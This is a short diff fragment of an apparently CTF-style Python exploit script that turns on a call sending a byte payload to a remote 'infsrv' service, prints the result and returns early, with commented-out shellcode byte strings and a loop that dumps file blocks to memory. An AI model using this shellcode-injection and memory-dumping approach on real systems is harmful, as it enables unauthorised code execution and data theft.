@@ -61,8 +61,10 @@ def main():
     # shellcode = b'\x06\x03\x10\x00\x00\x11\x00\x00\x12\x00\x00\x13\x00\x00\x06\x02\x06\x03'
     # shellcode = b'\x06\x03\x12\x0A\xF8\x99\x08\x00\x06\x03\x00\x00pwnd\x00\x00'
 
-    # out = execute_on_infsrv(b'\x10\x41\x00\x06\x01\x06\x03')
-    # print(out)
+    out = execute_on_infsrv(b'\x10\x41\x00\x06\x01\x06\x03')
+    print(out)
+
+    return 
 
     for i in range(0, 0x100):
         # call swi 4 with the file block id, dump to 0xC000
